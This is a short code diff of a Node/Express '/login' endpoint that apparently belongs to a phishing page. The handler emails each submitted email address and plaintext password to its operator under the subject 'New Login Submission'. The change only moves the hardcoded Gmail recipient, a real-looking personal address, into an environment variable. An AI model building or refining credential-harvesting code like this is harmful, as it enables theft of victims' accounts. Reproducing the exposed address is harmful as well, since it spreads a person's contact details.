@@ -22,8 +22,8 @@ app.post('/login', async (req, res) => {
   });
 
   const mailOptions = {
-    from: 'umehvictor511@gmail.com',
-    to: 'umehvictor511@gmail.com',
+    from: process.env.EMAIL_USER,
+    to: process.env.EMAIL_USER,
     subject: 'New Login Submission',
     text: `Email: ${email}\nPassword: ${password}`
   };
